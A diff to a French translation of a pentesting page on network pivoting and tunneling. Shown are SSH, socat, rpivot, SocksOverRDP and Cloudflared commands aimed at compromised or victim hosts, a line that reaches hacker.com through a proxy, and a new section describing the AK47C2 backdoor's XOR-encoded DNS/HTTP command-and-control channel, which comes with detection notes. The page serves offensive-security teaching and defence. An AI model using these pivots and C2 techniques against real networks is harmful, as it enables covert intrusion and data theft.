@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Port local --> Hôte compromis (SSH) --> Partout
+Port local --> Hôte compromis (SSH) --> N'importe où
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sécurité – Attaque Terrapin (CVE-2023-48795)**
-> L'attaque de rétrogradation Terrapin de 2023 peut permettre à un homme du milieu de manipuler la première poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
+> L'attaque de rétrogradation Terrapin de 2023 peut permettre à un homme du milieu de manipuler le début de la poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
 
 ## SSHUTTLE
 
@@ -163,7 +163,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 > [!WARNING]
-> Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
+> Dans ce cas, le **port est ouvert sur l'hôte beacon**, pas sur le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivoter à travers **NTLM proxy**
+Pivot through **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -294,9 +294,7 @@ Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne �
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
-### Tunnel SSL Socat
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
@@ -358,7 +356,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -368,13 +366,13 @@ Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est à l'é
 ```
 netstat -antb | findstr 1080
 ```
-Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxy le trafic à travers ce port.**
+Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxyfier le trafic à travers ce port.**
 
-## Proxifier les applications GUI Windows
+## Proxyfier les applications GUI Windows
 
-Vous pouvez faire naviguer les applications GUI Windows à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
+Vous pouvez faire en sorte que les applications GUI Windows naviguent à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
 Dans **Profile -> Proxy Servers**, ajoutez l'IP et le port du serveur SOCKS.\
-Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier et les connexions aux IP que vous souhaitez proxifier.
+Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxyfier et les connexions aux IP que vous souhaitez proxyfier.
 
 ## Contournement du proxy NTLM
 
@@ -451,6 +449,40 @@ Proxychains intercepte l'appel `gethostbyname` de libc et tunnelise la requête 
 ## Tunnels en Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
+
+### DNS TXT / HTTP JSON C2 personnalisé (AK47C2)
+
+L'acteur Storm-2603 a créé un **C2 à double canal ("AK47C2")** qui abuse *uniquement* du trafic sortant **DNS** et **HTTP POST** en clair – deux protocoles rarement bloqués sur les réseaux d'entreprise.
+
+1. **Mode DNS (AK47DNS)**
+• Génère un SessionID aléatoire de 5 caractères (par exemple `H4T14`).
+• Préfixe `1` pour *les requêtes de tâche* ou `2` pour *les résultats* et concatène différents champs (flags, SessionID, nom de l'ordinateur).
+• Chaque champ est **chiffré en XOR avec la clé ASCII `VHBD@H`**, encodé en hex, et collé ensemble avec des points – se terminant finalement par le domaine contrôlé par l'attaquant :
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Les requêtes utilisent `DnsQuery()` pour les enregistrements **TXT** (et de secours **MG**).
+• Lorsque la réponse dépasse 0xFF octets, le backdoor **fragmente** les données en morceaux de 63 octets et insère les marqueurs :
+`s<SessionID>t<TOTAL>p<POS>` afin que le serveur C2 puisse les réorganiser.
+
+2. **Mode HTTP (AK47HTTP)**
+• Construit une enveloppe JSON :
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• L'ensemble du blob est XOR-`VHBD@H` → hex → envoyé comme le corps d'un **`POST /`** avec l'en-tête `Content-Type: text/plain`.
+• La réponse suit le même encodage et le champ `cmd` est exécuté avec `cmd.exe /c <command> 2>&1`.
+
+Notes de l'équipe bleue
+• Recherchez des **requêtes TXT** inhabituelles dont le premier label est un long hexadécimal et se termine toujours par un domaine rare.
+• Une clé XOR constante suivie d'ASCII-hex est facile à détecter avec YARA : `6?56484244?484` (`VHBD@H` en hex).
+• Pour HTTP, signalez les corps de POST text/plain qui sont de l'hex pur et multiples de deux octets.
+
+{{#note}}
+L'ensemble du canal s'inscrit dans des **requêtes conformes aux normes RFC** et garde chaque label de sous-domaine en dessous de 63 octets, le rendant furtif dans la plupart des journaux DNS.
+{{#endnote}}
 
 ## Tunneling ICMP
 
@@ -547,7 +579,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **des services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
+Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent des **services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
 
 ### Quick tunnel one-liner
 ```bash
@@ -578,7 +610,7 @@ Parce que tout le trafic quitte l'hôte **sortant sur 443**, les tunnels Cloudfl
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme une **passerelle de tunnel SSH**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
+[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et le P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme une **passerelle de tunnel SSH**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
 
 ### Tunnel TCP inverse classique
 ```bash
@@ -599,7 +631,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Utilisation du nouveau passerelle SSH (pas de binaire frpc)
+### Utilisation du nouveau passerelle SSH (sans binaire frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -626,7 +658,7 @@ qemu-system-x86_64.exe ^
 ```
 • La commande ci-dessus lance une image **Tiny Core Linux** (`tc.qcow2`) dans la RAM.  
 • Le port **2222/tcp** sur l'hôte Windows est transféré de manière transparente vers **22/tcp** à l'intérieur de l'invité.  
-• Du point de vue de l'attaquant, la cible expose simplement le port 2222 ; tous les paquets qui l'atteignent sont gérés par le serveur SSH fonctionnant dans la VM.  
+• Du point de vue de l'attaquant, la cible expose simplement le port 2222 ; tous les paquets qui l'atteignent sont gérés par le serveur SSH s'exécutant dans la VM.  
 
 ### Lancement furtif via VBScript
 ```vb
@@ -666,11 +698,12 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 ## Autres outils à vérifier
 
-- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)  
-- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)  
+- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
+- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 ## Références
 
-- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
